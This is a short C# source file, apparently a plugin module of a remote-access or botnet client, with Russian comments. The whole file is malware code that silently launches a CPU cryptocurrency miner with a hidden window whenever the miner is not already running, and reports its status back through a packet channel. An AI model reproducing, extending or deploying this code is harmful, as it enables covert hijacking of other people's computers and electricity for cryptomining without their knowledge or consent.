using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin
{
    class Cpu_Run
    {
        public static void CmdRun()
        {
            new Thread(() =>
            {
                try
                {   // Если файла нету то полностью останавливаем цикл
                    if (!File.Exists(Properties.CPU.Default.cpuBin))
                        return;
                }
                catch { }
                try
                {
                    Process[] pname = Process.GetProcessesByName(Properties.CPU.Default.cpuProc);
                    if (pname.Length == 0)
                    {
                        /* Запуск майнера через cmd */
                        Process p = new Process();
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.Arguments = Properties.CPU.Default.cpuParametrs;
                        p.StartInfo.FileName = Properties.CPU.Default.cpuBin;
                        p.Start();
                        p.WaitForExit();
                        Packet.Error("CPU Miner Stopped.");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Packet.Error(ex.Message);
                    return;
                }
            }).Start();
        }
    }
}
